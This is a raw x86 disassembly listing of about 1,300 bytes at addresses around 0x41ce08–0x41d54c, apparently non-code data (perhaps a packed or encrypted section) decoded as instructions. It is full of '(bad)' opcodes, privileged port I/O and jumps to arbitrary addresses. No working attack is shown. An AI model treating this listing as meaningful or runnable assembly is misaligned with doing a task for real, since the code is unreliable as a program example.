  41ce08:	or     esp,DWORD PTR [ecx]
  41ce0a:	dec    esi
  41ce0b:	or     BYTE PTR [esi-0x5b],dl
  41ce0e:	out    0x95,al
  41ce10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ce11:	xor    eax,0xdaf337e1
  41ce16:	inc    edx
  41ce17:	pop    DWORD PTR [esp+ecx*2+0x7ee774e9]
  41ce1e:	out    dx,eax
  41ce1f:	jmp    0x41ce39
  41ce21:	and    eax,0xb7fcaad2
  41ce26:	lock test al,0x1f
  41ce29:	outs   dx,BYTE PTR ds:[esi]
  41ce2a:	into   
  41ce2b:	push   0xdc9caacd
  41ce30:	mov    esp,0x85ae1602
  41ce35:	fisttp QWORD PTR [ecx]
  41ce37:	mov    edi,0xed4eb771
  41ce3c:	jmp    0x8283819a
  41ce41:	inc    ebp
  41ce42:	cli    
  41ce43:	add    ch,dh
  41ce45:	test   al,0x3
  41ce47:	jns    0x41cea8
  41ce49:	fistp  QWORD PTR [ebx+0x4e]
  41ce4c:	cld    
  41ce4d:	je     0x41ce20
  41ce4f:	or     DWORD PTR [eax-0x4f05b97b],ebp
  41ce55:	(bad)  
  41ce56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ce57:	xchg   edi,eax
  41ce58:	iret   
  41ce59:	popf   
  41ce5a:	ficomp WORD PTR [edx+edx*1-0x5e]
  41ce5e:	push   edx
  41ce5f:	or     edx,DWORD PTR [edi+edx*1+0x7e]
  41ce63:	dec    edx
  41ce64:	jecxz  0x41ceb7
  41ce66:	sbb    edx,eax
  41ce68:	mov    edx,0x3eeb3dde
  41ce6d:	dec    edi
  41ce6e:	das    
  41ce6f:	clc    
  41ce70:	jne    0x41ce68
  41ce72:	retf   0xdadb
  41ce75:	ss mov cl,0x24
  41ce78:	cmp    al,dl
  41ce7a:	inc    edx
  41ce7b:	repnz xchg edi,ecx
  41ce7e:	pushf  
  41ce7f:	mov    eax,ds:0x6058a2ce
  41ce84:	test   eax,0xe2f24bd2
  41ce89:	vpmuludq xmm5,xmm5,XMMWORD PTR [esi]
  41ce8d:	push   cs
  41ce8e:	or     eax,ebx
  41ce90:	cli    
  41ce91:	mov    BYTE PTR [esi],0x16
  41ce94:	mov    ebx,0x43d0bd4b
  41ce99:	stc    
  41ce9a:	fld    TBYTE PTR [esi+0x29]
  41ce9d:	and    DWORD PTR [ecx-0x2b],eax
  41cea0:	(bad)  
  41cea1:	leave  
  41cea2:	in     eax,dx
  41cea3:	inc    ebx
  41cea4:	leave  
  41cea5:	ret    0x1454
  41cea8:	shl    DWORD PTR [ecx+0x4b],cl
  41ceab:	in     al,0xcb
  41cead:	int3   
  41ceae:	push   ebp
  41ceaf:	rcr    DWORD PTR [edi+0x493e1486],1
  41ceb5:	outs   dx,DWORD PTR gs:[esi]
  41ceb7:	jecxz  0x41ce6e
  41ceb9:	in     eax,0x6
  41cebb:	lods   eax,DWORD PTR ds:[esi]
  41cebc:	fdivr  DWORD PTR [ebx]
  41cebe:	pop    ss
  41cebf:	rcr    eax,0x7a
  41cec2:	cmp    edi,ebx
  41cec4:	inc    edx
  41cec5:	mov    ecx,0xae64f3a4
  41ceca:	loopne 0x41cf4b
  41cecc:	xor    DWORD PTR [ebx-0x34ccfe14],esi
  41ced2:	cli    
  41ced3:	pop    esp
  41ced4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ced5:	(bad)  
  41ced6:	adc    al,BYTE PTR [esi+0x20]
  41ced9:	or     eax,0x3cc627e5
  41cede:	test   esp,0x61bc25dc
  41cee4:	pop    ds
  41cee5:	cmp    BYTE PTR [eax+0x202d09fa],dl
  41ceeb:	hlt    
  41ceec:	xor    DWORD PTR [ecx-0x69],edx
  41ceef:	lea    esp,[ebx+0x6424c010]
  41cef5:	retf   
  41cef6:	jg     0x41cea6
  41cef8:	(bad)
  41cefb:	cdq    
  41cefc:	test   DWORD PTR [ebx-0x45],0xf4458d53
  41cf03:	jle    0x41cf13
  41cf05:	aad    0xf
  41cf07:	test   BYTE PTR [edx],bl
  41cf09:	test   al,0x6a
  41cf0b:	xchg   esi,eax
  41cf0c:	xchg   edi,eax
  41cf0d:	jmp    0x5afd3002
  41cf12:	(bad)  
  41cf13:	jnp    0x41cf82
  41cf15:	(bad)  
  41cf17:	imul   eax,DWORD PTR [ecx+0xfd716a5],0x17
  41cf1e:	retf   0x332e
  41cf21:	inc    edi
  41cf22:	xor    DWORD PTR [eax],eax
  41cf24:	ds (bad) 
  41cf26:	retf   0x1e61
  41cf29:	and    al,0xf9
  41cf2b:	push   edx
  41cf2c:	sbb    dl,bl
  41cf2e:	pop    ss
  41cf2f:	mov    ch,0x74
  41cf31:	fisttp DWORD PTR [esi]
  41cf33:	lock loop 0x41ceeb
  41cf36:	jmp    FWORD PTR [esp+ebp*1]
  41cf39:	test   cl,al
  41cf3b:	mov    ecx,0xbb23b593
  41cf40:	or     al,0xc3
  41cf42:	test   eax,0x93ff0396
  41cf47:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf48:	sub    ch,BYTE PTR [edx]
  41cf4a:	loopne 0x41cfb5
  41cf4c:	dec    ebx
  41cf4d:	loopne 0x41cef4
  41cf4f:	mov    ds:0xd0b6512,al
  41cf54:	retf   
  41cf55:	adc    ebx,esi
  41cf57:	repnz loopne 0x41cf5c
  41cf5a:	jmp    0x41cf76
  41cf5c:	lods   al,BYTE PTR ds:[esi]
  41cf5d:	xor    DWORD PTR [eax],edi
  41cf5f:	or     DWORD PTR [esi],0xffffff8b
  41cf62:	mov    ebp,0x1a33944
  41cf67:	mov    ds:0x5fa3d855,eax
  41cf6c:	xchg   ebp,eax
  41cf6d:	dec    ebp
  41cf6e:	in     al,0xcd
  41cf70:	dec    edx
  41cf71:	rcl    DWORD PTR [esp+eiz*8],1
  41cf74:	cmp    eax,0x8f09f0c1
  41cf79:	leave  
  41cf7a:	icebp  
  41cf7b:	pop    ss
  41cf7c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cf7d:	add    ecx,edi
  41cf7f:	scas   eax,DWORD PTR es:[edi]
  41cf80:	mov    eax,ds:0x17531b44
  41cf85:	(bad)  
  41cf86:	jno    0x41cfa8
  41cf88:	(bad)
  41cf8c:	add    BYTE PTR [esi-0x37],bh
  41cf8f:	jns    0x41cfd3
  41cf91:	pop    ebx
  41cf92:	pop    ds
  41cf93:	push   cs
  41cf94:	(bad)  
  41cf96:	daa    
  41cf97:	mov    ebx,0x685817f5
  41cf9c:	(bad)  
  41cf9e:	repz pop ss
  41cfa0:	hlt    
  41cfa1:	mov    bl,0xc5
  41cfa3:	mov    BYTE PTR [edx+0x78d2e157],bl
  41cfa9:	mov    dl,0x4b
  41cfab:	fdiv   st(4),st
  41cfad:	sub    edi,ecx
  41cfaf:	icebp  
  41cfb0:	jae    0x41cf96
  41cfb2:	adc    BYTE PTR [ecx+0x72],0x60
  41cfb6:	test   eax,0x63694c57
  41cfbb:	mov    dh,0x39
  41cfbd:	dec    ebp
  41cfbe:	(bad)
  41cfc1:	push   0xa96f9944
  41cfc6:	call   0x611d:0xc91d10d2
  41cfcd:	adc    DWORD PTR [edi+0x1],edi
  41cfd0:	adc    ah,BYTE PTR [esi-0x444f28d3]
  41cfd6:	adc    al,0x68
  41cfd8:	jp     0x41cf6e
  41cfda:	aad    0xc2
  41cfdc:	add    BYTE PTR [edi],0x81
  41cfdf:	and    edx,DWORD PTR ds:0xc46dc711
  41cfe5:	fimul  DWORD PTR [eax+ebp*1-0x75b261e4]
  41cfec:	ins    DWORD PTR es:[edi],dx
  41cfed:	jnp    0x41d02c
  41cfef:	and    edi,DWORD PTR [eax+0x47a8423a]
  41cff5:	or     al,0x22
  41cff7:	sahf   
  41cff8:	pop    ebp
  41cff9:	frstor [ebp+eax*1-0x231fab22]
  41d000:	xor    al,0xd8
  41d002:	xor    ah,BYTE PTR [edx]
  41d004:	mov    esp,ebx
  41d006:	push   0x443261a6
  41d00b:	sub    eax,0xac226b5e
  41d010:	stos   DWORD PTR es:[edi],eax
  41d011:	push   esp
  41d012:	test   al,0xa9
  41d014:	aam    0x5e
  41d016:	iret   
  41d017:	sbb    esi,esp
  41d019:	pop    edi
  41d01a:	mov    ds:0xaf549d1f,eax
  41d01f:	push   esi
  41d020:	aad    0xd7
  41d022:	lock adc al,0x81
  41d025:	ret    
  41d026:	pop    ss
  41d027:	push   ebp
  41d028:	adc    DWORD PTR [ebp-0x44],ebx
  41d02b:	rol    DWORD PTR [esi],cl
  41d02d:	aad    0x11
  41d02f:	scas   eax,DWORD PTR es:[edi]
  41d030:	lods   al,BYTE PTR ds:[esi]
  41d031:	fidiv  DWORD PTR [ecx]
  41d033:	dec    edi
  41d034:	mov    cl,0x9
  41d036:	pushf  
  41d037:	je     0x41d05e
  41d039:	inc    esi
  41d03a:	(bad)  [ecx-0x20]
  41d03d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d03e:	xchg   ebp,eax
  41d03f:	scas   eax,DWORD PTR es:[edi]
  41d040:	pop    esi
  41d041:	ror    BYTE PTR [ecx-0x4e059b1d],1
  41d047:	adc    ah,al
  41d049:	push   edx
  41d04a:	mov    ecx,0xc2317ea1
  41d04f:	dec    ebp
  41d050:	lea    eax,[ebp-0x3ac1e415]
  41d056:	cmp    esp,edi
  41d058:	lea    ecx,[eax*8+0x6cf496ac]
  41d05f:	fs jne 0x41d0ae
  41d062:	jns    0x41d0ba
  41d064:	inc    edx
  41d065:	pop    edi
  41d066:	mov    edi,0xc075e61d
  41d06b:	pop    esi
  41d06c:	dec    edx
  41d06d:	mov    fs,eax
  41d06f:	outs   dx,DWORD PTR ds:[esi]
  41d070:	xchg   BYTE PTR [eax+edx*1-0x5ce44bea],bh
  41d077:	leave  
  41d078:	inc    esp
  41d079:	adc    dh,BYTE PTR [esi]
  41d07b:	ins    DWORD PTR es:[edi],dx
  41d07c:	out    0xdd,eax
  41d07e:	cmc    
  41d07f:	mov    es:0xb95cf55c,al
  41d085:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d086:	sbb    al,0xf1
  41d088:	std    
  41d089:	jne    0x41d100
  41d08b:	cmc    
  41d08c:	jl     0x41d0a8
  41d08e:	and    al,0x91
  41d090:	sbb    dl,BYTE PTR [ecx]
  41d092:	outs   dx,DWORD PTR gs:[esi]
  41d094:	cmovg  eax,DWORD PTR [ebp-0x4e]
  41d098:	dec    eax
  41d099:	xchg   ebp,eax
  41d09a:	mov    edi,0xfd7b4abb
  41d09f:	ret    
  41d0a0:	push   ds
  41d0a1:	pop    ds
  41d0a2:	pop    ebx
  41d0a3:	mov    eax,ds:0xb88df0ca
  41d0a8:	arpl   WORD PTR [ebx-0x596a4040],si
  41d0ae:	xor    eax,0xf57ee7c9
  41d0b3:	xlat   BYTE PTR ds:[ebx]
  41d0b4:	add    BYTE PTR [edi-0x673330c5],0x42
  41d0bb:	or     eax,0x9e97260c
  41d0c0:	mov    ebx,0x9ef1327d
  41d0c5:	xchg   ebx,eax
  41d0c6:	mov    eax,0xa40b551f
  41d0cb:	cmp    eax,0xf2dd3e9a
  41d0d0:	jge    0x41d109
  41d0d2:	jg     0x41d13c
  41d0d4:	loop   0x41d0a2
  41d0d6:	and    DWORD PTR [esi+0x18],esp
  41d0d9:	(bad)  
  41d0da:	jl     0x41d0e3
  41d0dc:	cmp    eax,0x998f894a
  41d0e1:	inc    esp
  41d0e2:	in     al,dx
  41d0e3:	sub    ecx,0x2b7d2334
  41d0e9:	int3   
  41d0ea:	cmp    esi,edi
  41d0ec:	push   cs
  41d0ed:	std    
  41d0ee:	add    DWORD PTR [esi-0x51deca4c],eax
  41d0f4:	mov    dh,0xce
  41d0f6:	leave  
  41d0f7:	(bad)  
  41d0f8:	imul   DWORD PTR [ebp-0x7d]
  41d0fb:	sbb    bh,BYTE PTR [edx]
  41d0fd:	pop    esi
  41d0fe:	push   esp
  41d0ff:	aas    
  41d100:	or     al,0x86
  41d102:	pop    esp
  41d103:	push   ss
  41d104:	(bad)  
  41d105:	mov    dl,0xb
  41d107:	sub    al,0xfc
  41d109:	push   esi
  41d10a:	das    
  41d10b:	push   ebp
  41d10c:	(bad)  
  41d10d:	into   
  41d10e:	sbb    BYTE PTR [edx-0x57],bl
  41d111:	mov    al,ds:0x4fe81ddb
  41d116:	sbb    dh,BYTE PTR [ecx]
  41d118:	inc    edi
  41d119:	sahf   
  41d11a:	sbb    al,0xe0
  41d11c:	dec    ebx
  41d11d:	ret    0x1dc9
  41d120:	pop    edx
  41d121:	ret    
  41d122:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d123:	shl    BYTE PTR [edi],0x2c
  41d126:	mov    ecx,esp
  41d128:	mov    ch,0xaa
  41d12a:	lods   al,BYTE PTR ds:[esi]
  41d12b:	push   edx
  41d12c:	adc    DWORD PTR ds:0xe4c9bcc9,edx
  41d132:	popf   
  41d133:	xchg   esp,eax
  41d134:	les    edx,FWORD PTR [ecx]
  41d136:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d137:	hlt    
  41d138:	mov    bh,0xe6
  41d13a:	stos   DWORD PTR es:[edi],eax
  41d13b:	xchg   ebx,eax
  41d13c:	mov    ebx,?
  41d13e:	aas    
  41d13f:	les    ebx,FWORD PTR [ecx]
  41d141:	in     al,0xf7
  41d143:	ins    DWORD PTR es:[edi],dx
  41d144:	mov    ds,WORD PTR [edi]
  41d146:	push   edx
  41d147:	iret   
  41d148:	out    0xf4,eax
  41d14a:	add    BYTE PTR [esp+ebp*8],ah
  41d14d:	stos   DWORD PTR es:[edi],eax
  41d14e:	arpl   WORD PTR [ebx],di
  41d150:	cmp    BYTE PTR [ebx-0x1d2a43b3],ch
  41d156:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d157:	sub    al,0x79
  41d159:	cmp    eax,0x37a9a847
  41d15e:	push   edx
  41d15f:	dec    eax
  41d160:	xchg   ecx,eax
  41d161:	or     DWORD PTR [edx-0x7fb618b0],ebp
  41d167:	push   ds
  41d168:	int3   
  41d169:	mov    ds:0x1deceb3d,eax
  41d16e:	cwde   
  41d16f:	mov    esi,0x63da9aef
  41d174:	ins    BYTE PTR es:[edi],dx
  41d175:	mov    esp,0x29be6e54
  41d17a:	sbb    edi,DWORD PTR [edi]
  41d17c:	sub    ecx,0x544029ee
  41d182:	jl     0x41d189
  41d184:	push   edx
  41d185:	sti    
  41d186:	sub    ecx,eax
  41d188:	xchg   DWORD PTR [edx-0x48],esp
  41d18b:	or     bl,al
  41d18d:	les    esp,FWORD PTR [ebx]
  41d18f:	ret    0x9d14
  41d192:	cmc    
  41d193:	aam    0x37
  41d195:	je     0x41d1ab
  41d197:	sub    dh,al
  41d199:	mov    eax,ds:0xdba5185c
  41d19e:	jnp    0x41d1cf
  41d1a0:	inc    ebx
  41d1a1:	clc    
  41d1a2:	fldcw  WORD PTR [edx-0x11354260]
  41d1a8:	das    
  41d1a9:	je     0x41d225
  41d1ab:	lds    esp,FWORD PTR [edx+0x75de7408]
  41d1b1:	inc    edi
  41d1b2:	lods   eax,DWORD PTR ds:[esi]
  41d1b3:	cmp    eax,0xfa4568ab
  41d1b8:	mov    ebx,0x9461ec57
  41d1bd:	enter  0x253a,0xe7
  41d1c1:	pop    ss
  41d1c2:	inc    edi
  41d1c3:	xchg   esi,eax
  41d1c4:	adc    DWORD PTR [ebp-0x639f013a],eax
  41d1ca:	in     eax,dx
  41d1cb:	aas    
  41d1cc:	mov    al,0x7b
  41d1ce:	pop    eax
  41d1cf:	(bad)  
  41d1d0:	enter  0x8390,0x1a
  41d1d4:	pop    edi
  41d1d5:	bound  ecx,QWORD PTR [ebp+0x6fce0a37]
  41d1db:	in     al,0xea
  41d1dd:	dec    ebx
  41d1de:	jns    0x41d219
  41d1e0:	pop    eax
  41d1e1:	popa   
  41d1e2:	(bad)  
  41d1e3:	sbb    BYTE PTR [eax+ebx*8],al
  41d1e6:	mov    DWORD PTR [ebx],ebx
  41d1e8:	scas   al,BYTE PTR es:[edi]
  41d1e9:	scas   eax,DWORD PTR es:[edi]
  41d1ea:	sbb    eax,0x66b4c10c
  41d1ef:	mov    cl,0x15
  41d1f1:	lea    eax,[edi]
  41d1f3:	xor    DWORD PTR [eax-0x3e],ebp
  41d1f6:	imul   esi,DWORD PTR [ebx+0x2c2eff91],0xffffff88
  41d1fd:	sub    dh,BYTE PTR [ebx]
  41d1ff:	or     al,0xe8
  41d201:	xchg   ebp,eax
  41d202:	jecxz  0x41d248
  41d204:	sbb    bh,BYTE PTR [edx+0x69]
  41d207:	mov    eax,ds:0x43a28000
  41d20c:	lods   al,BYTE PTR ds:[esi]
  41d20d:	mov    DWORD PTR [ebp-0x737539ee],ebp
  41d213:	jnp    0x41d278
  41d215:	mov    gs,WORD PTR [edi]
  41d217:	pop    eax
  41d218:	jg     0x41d1bb
  41d21a:	sub    al,0xb4
  41d21c:	mov    esi,0xff889c83
  41d221:	cdq    
  41d222:	xchg   ebp,eax
  41d223:	dec    eax
  41d224:	pop    edi
  41d225:	lock lods eax,DWORD PTR ds:[esi]
  41d227:	sub    eax,0xfb1bef41
  41d22c:	ss leave 
  41d22e:	jle    0x41d1d3
  41d230:	outs   dx,DWORD PTR ds:[esi]
  41d231:	in     eax,dx
  41d232:	xchg   esp,eax
  41d233:	lea    ebx,[edx+0x7c8d93a4]
  41d239:	(bad)  [eax]
  41d23b:	jmp    0x41d278
  41d23d:	mov    DWORD PTR [ecx-0x6c963b],esp
  41d243:	pop    ds
  41d244:	lock into 
  41d246:	add    eax,0xf1444fff
  41d24b:	fist   DWORD PTR [esi+edx*1-0x6d6ff134]
  41d252:	xor    eax,0x637b0b66
  41d257:	sub    dl,BYTE PTR [eax-0x613c72bb]
  41d25d:	xchg   edx,eax
  41d25e:	lock mov al,ds:0x3164ca83
  41d264:	test   eax,0xcb8f0f1c
  41d269:	mov    al,ds:0x753c21ba
  41d26e:	adc    ebx,ebx
  41d270:	push   ds
  41d271:	mov    al,0xf9
  41d273:	(bad)  
  41d274:	daa    
  41d275:	xor    ebp,DWORD PTR [eax+0x4cebfc4d]
  41d27b:	or     edi,DWORD PTR ds:0xbf342082
  41d281:	mov    ebx,0x881bf046
  41d286:	jns    0x41d2dc
  41d288:	pop    ecx
  41d289:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d28a:	cmp    bl,BYTE PTR [edx]
  41d28c:	sbb    al,bh
  41d28e:	ins    DWORD PTR es:[edi],dx
  41d28f:	and    BYTE PTR [ebx+0x33],ch
  41d292:	xchg   edi,eax
  41d293:	or     cl,BYTE PTR [ebx+0x7b]
  41d296:	push   cs
  41d297:	pop    es
  41d298:	jecxz  0x41d2f7
  41d29a:	fcomp  DWORD PTR [ebx-0x9c23bcd]
  41d2a0:	pop    ecx
  41d2a1:	mov    cs,WORD PTR [ecx+0x3b6e4473]
  41d2a7:	aas    
  41d2a8:	xchg   edi,eax
  41d2a9:	call   0x3626:0x455f24a3
  41d2b0:	gs ins BYTE PTR es:[edi],dx
  41d2b2:	push   cs
  41d2b3:	clc    
  41d2b4:	test   BYTE PTR [edi+ecx*4+0x75],0xac
  41d2b9:	mov    BYTE PTR [ecx-0x3],0x1b
  41d2bd:	pushw  es
  41d2bf:	lahf   
  41d2c0:	loopne 0x41d2e8
  41d2c2:	add    eax,0x192859af
  41d2c7:	push   eax
  41d2c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d2c9:	not    BYTE PTR [esi-0x4a]
  41d2cc:	dec    ebp
  41d2cd:	xchg   ebp,eax
  41d2ce:	pop    edx
  41d2cf:	outs   dx,BYTE PTR ds:[esi]
  41d2d0:	mov    ah,0xc6
  41d2d2:	xlat   BYTE PTR ds:[ebx]
  41d2d3:	out    0xa0,al
  41d2d5:	push   ebx
  41d2d6:	pusha  
  41d2d7:	jecxz  0x41d270
  41d2d9:	xchg   esp,eax
  41d2da:	jmp    0x41d2de
  41d2dc:	cmp    al,0x82
  41d2de:	ss stos DWORD PTR es:[edi],eax
  41d2e0:	pushf  
  41d2e1:	push   cs
  41d2e2:	mov    BYTE PTR [eax],dh
  41d2e4:	pop    esp
  41d2e5:	add    bl,BYTE PTR [esi]
  41d2e7:	inc    eax
  41d2e8:	mov    al,ds:0xa46b895d
  41d2ed:	and    al,0x99
  41d2ef:	adc    dh,BYTE PTR [esi]
  41d2f1:	fwait
  41d2f2:	xor    DWORD PTR [esi],esi
  41d2f4:	inc    ecx
  41d2f5:	loopne 0x41d2bc
  41d2f7:	aaa    
  41d2f8:	xor    BYTE PTR [ebp-0x67913bf2],0x71
  41d2ff:	jmp    0x26f47108
  41d304:	inc    esi
  41d305:	mov    ds:0xf1c70099,eax
  41d30a:	sbb    edi,DWORD PTR [ecx+0x76177adf]
  41d310:	dec    ebp
  41d311:	xchg   ebp,eax
  41d312:	int3   
  41d313:	ins    BYTE PTR es:[edi],dx
  41d314:	sbb    eax,0x2f8430af
  41d319:	sahf   
  41d31a:	pusha  
  41d31b:	add    BYTE PTR [edx-0x5627c85f],cl
  41d321:	mov    eax,ds:0x61d9e4c4
  41d326:	into   
  41d327:	sar    BYTE PTR [edi+0x10],0x15
  41d32b:	fwait
  41d32c:	cdq    
  41d32d:	call   0xf3d9:0x6552e01e
  41d334:	daa    
  41d335:	ins    DWORD PTR es:[edi],dx
  41d336:	test   BYTE PTR [ebx],0xb4
  41d339:	or     eax,0xf0da64ab
  41d33e:	sti    
  41d33f:	xchg   BYTE PTR [ecx+eiz*1+0x2b1aeced],ch
  41d346:	mov    esi,0x6180deb3
  41d34b:	mov    ecx,0xb407b352
  41d350:	and    al,0x94
  41d352:	bound  edi,QWORD PTR [bx+0x4cf4]
  41d357:	jp     0x41d35d
  41d359:	pop    ss
  41d35a:	leave  
  41d35b:	xchg   ebp,eax
  41d35c:	pusha  
  41d35d:	repnz xchg ebx,eax
  41d35f:	aad    0x2b
  41d361:	xor    ebx,DWORD PTR ds:0x485fd21a
  41d367:	cmp    eax,0xdccfdeb2
  41d36c:	cmp    ch,ch
  41d36e:	jne    0x41d364
  41d370:	cmp    BYTE PTR [ebx],al
  41d372:	out    dx,eax
  41d373:	lock sti 
  41d375:	cld    
  41d376:	pop    esi
  41d377:	cmp    eax,0x6af6ce36
  41d37c:	bound  esp,QWORD PTR [edx-0x5e8ffbc]
  41d382:	cdq    
  41d383:	sbb    DWORD PTR [eax+0x32a718ac],esi
  41d389:	sub    eax,0xe40f7f64
  41d38e:	arpl   WORD PTR [esi-0x6216ff3e],ax
  41d394:	out    dx,eax
  41d395:	cli    
  41d396:	loop   0x41d3a5
  41d398:	mov    ecx,0x4cde4a4e
  41d39d:	pop    esp
  41d39e:	aad    0xa0
  41d3a0:	outs   dx,BYTE PTR ds:[esi]
  41d3a1:	ins    DWORD PTR es:[edi],dx
  41d3a2:	and    BYTE PTR [edi+0x10dec751],ah
  41d3a8:	dec    esp
  41d3a9:	add    DWORD PTR [edi+0x31],esi
  41d3ac:	jecxz  0x41d39e
  41d3ae:	ins    DWORD PTR es:[edi],dx
  41d3af:	xchg   ecx,eax
  41d3b0:	xlat   BYTE PTR ds:[ebx]
  41d3b1:	in     al,dx
  41d3b2:	and    ah,dl
  41d3b4:	and    BYTE PTR [esi+0x77c4fb68],bl
  41d3ba:	retf   
  41d3bb:	retf   
  41d3bc:	xchg   ecx,eax
  41d3bd:	push   ebx
  41d3be:	push   ebp
  41d3bf:	inc    eax
  41d3c0:	sbb    al,0x9b
  41d3c2:	out    dx,eax
  41d3c3:	push   ds
  41d3c4:	test   BYTE PTR [edx+0x61f06d04],dl
  41d3ca:	test   BYTE PTR [edi+0x75],bh
  41d3cd:	or     DWORD PTR [esi],ecx
  41d3cf:	mov    ch,0x7c
  41d3d1:	or     bl,BYTE PTR [edx]
  41d3d3:	xchg   BYTE PTR [esi+esi*8+0x78a73f54],dh
  41d3da:	inc    ecx
  41d3db:	ds cs cld 
  41d3de:	inc    edi
  41d3df:	jno    0x41d452
  41d3e1:	xchg   ebx,eax
  41d3e2:	pop    esp
  41d3e3:	nop
  41d3e4:	repz jnp 0x41d3e4
  41d3e7:	mov    dl,0x4d
  41d3e9:	mov    eax,ds:0x7aaf6b49
  41d3ee:	or     ebp,esi
  41d3f0:	shl    BYTE PTR [ecx+0x171f7651],1
  41d3f6:	fsub   DWORD PTR [esi+0x21]
  41d3f9:	sub    ch,cl
  41d3fb:	call   0x98d586ce
  41d400:	adc    eax,0xaa781732
  41d405:	mov    dl,0xe9
  41d407:	pop    eax
  41d408:	scas   al,BYTE PTR es:[edi]
  41d409:	mov    BYTE PTR [edi+0x2c],ch
  41d40c:	sub    ah,BYTE PTR ds:0xf4acf1a7
  41d412:	call   0xd483b1a9
  41d417:	add    DWORD PTR [edi+0x3f],ebx
  41d41a:	sti    
  41d41b:	xchg   ecx,eax
  41d41c:	not    DWORD PTR [ebx+eiz*2+0x37]
  41d420:	or     ecx,DWORD PTR [eax]
  41d422:	mov    DWORD PTR [esi+0x0],ebp
  41d425:	dec    ebp
  41d426:	jecxz  0x41d3b0
  41d428:	jl     0x41d3f2
  41d42a:	repnz sub ecx,ebp
  41d42d:	dec    esi
  41d42e:	dec    ebp
  41d42f:	lahf   
  41d430:	leave  
  41d431:	mov    dl,dh
  41d433:	neg    BYTE PTR [ebp+0x256c90d4]
  41d439:	mov    dl,BYTE PTR [eax]
  41d43b:	add    al,0xc2
  41d43d:	mov    ds:0x9d3aa009,al
  41d442:	and    edi,eax
  41d444:	cld    
  41d445:	lods   al,BYTE PTR ds:[esi]
  41d446:	xchg   esi,eax
  41d447:	jmp    0xbec:0x55e7fe93
  41d44e:	mov    ebx,0x9638a7fa
  41d453:	stc    
  41d454:	jmp    0x41d4a9
  41d456:	push   eax
  41d457:	sub    eax,0xce296c7a
  41d45c:	or     edi,DWORD PTR [eax]
  41d45e:	loopne 0x41d43c
  41d460:	mov    ds:0x13c462a8,al
  41d465:	sbb    al,0x2b
  41d467:	xchg   edx,eax
  41d468:	cmp    dl,BYTE PTR [edx+ecx*8-0x17920b69]
  41d46f:	push   0x24
  41d471:	fadd   st,st(6)
  41d473:	mov    ebx,DWORD PTR [ecx]
  41d475:	test   al,0xf
  41d477:	enter  0xddff,0x96
  41d47b:	dec    ebx
  41d47c:	dec    ebx
  41d47d:	or     al,0x5e
  41d47f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d480:	jmp    0xee8630d5
  41d485:	fwait
  41d486:	pop    es
  41d487:	data16 mov BYTE PTR [ebx],dl
  41d48a:	mov    bh,0x6f
  41d48c:	push   es
  41d48d:	scas   al,BYTE PTR es:[edi]
  41d48e:	sbb    DWORD PTR [ebp-0x7bdb23ca],0x626e60cb
  41d498:	data16 jns 0x41d4db
  41d49b:	imul   edx,DWORD PTR [esp+edx*2],0x1dc438f7
  41d4a2:	push   edx
  41d4a3:	retf   0x2069
  41d4a6:	mov    ebx,0x9524b81e
  41d4ab:	(bad)  
  41d4ac:	fistp  QWORD PTR [esi-0x78]
  41d4af:	cmc    
  41d4b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d4b1:	nop
  41d4b2:	xchg   edi,eax
  41d4b3:	in     eax,dx
  41d4b4:	xor    al,0x72
  41d4b6:	cmp    DWORD PTR [esi],edx
  41d4b8:	add    eax,0x543e27f6
  41d4bd:	retf   0x2d54
  41d4c0:	add    bh,BYTE PTR [ebx+0x7a]
  41d4c3:	xchg   edi,eax
  41d4c4:	mov    ds:0xb2328654,al
  41d4c9:	ins    DWORD PTR es:[edi],dx
  41d4ca:	or     ecx,DWORD PTR [esi+0x3e544195]
  41d4d0:	sub    DWORD PTR [esi+0x4d7d5a54],ecx
  41d4d6:	jmp    0x153e:0xdc864a22
  41d4dd:	xor    BYTE PTR ds:0x78079e71,bl
  41d4e3:	fnsave [edx-0x30e4d756]
  41d4e9:	jno    0x41d529
  41d4eb:	mov    ?,WORD PTR [eax-0x18edf2ed]
  41d4f1:	clc    
  41d4f2:	(bad)  
  41d4f3:	imul   edi,edx,0xffffffea
  41d4f6:	dec    edx
  41d4f7:	jno    0x41d489
  41d4f9:	in     eax,dx
  41d4fa:	dec    ebp
  41d4fb:	xor    al,BYTE PTR [edi+0x77]
  41d4fe:	stc    
  41d4ff:	outs   dx,DWORD PTR ds:[esi]
  41d500:	lds    edi,FWORD PTR [ebp+0x3c4dd25d]
  41d506:	aad    0xa2
  41d508:	lahf   
  41d509:	repnz add ecx,eax
  41d50c:	and    al,ch
  41d50e:	bound  ebx,QWORD PTR [esi]
  41d510:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d511:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d512:	xchg   edi,eax
  41d513:	(bad)  [edx]
  41d515:	gs cmc 
  41d517:	pop    ecx
  41d518:	mov    dh,0xbd
  41d51a:	nop
  41d51b:	add    dl,BYTE PTR [ecx-0x93951ce]
  41d521:	pop    edx
  41d522:	jo     0x41d4c3
  41d524:	sbb    BYTE PTR [edi-0x6d],0x9d
  41d528:	out    0x9e,eax
  41d52a:	imul   ebx,DWORD PTR [eax],0x2a8a67ed
  41d530:	cwde   
  41d531:	adc    DWORD PTR [ecx],esp
  41d533:	sub    DWORD PTR [edx+0x14],esp
  41d536:	pusha  
  41d537:	pop    ecx
  41d538:	in     eax,dx
  41d539:	cmp    eax,0x34d1fde1
  41d53e:	data16 (bad) 
  41d540:	jns    0x41d525
  41d542:	dec    edi
  41d543:	in     eax,dx
  41d544:	cmp    eax,0x82eceb0f
  41d549:	in     eax,0xa2
  41d54b:	cld    
  41d54c:	(bad)  
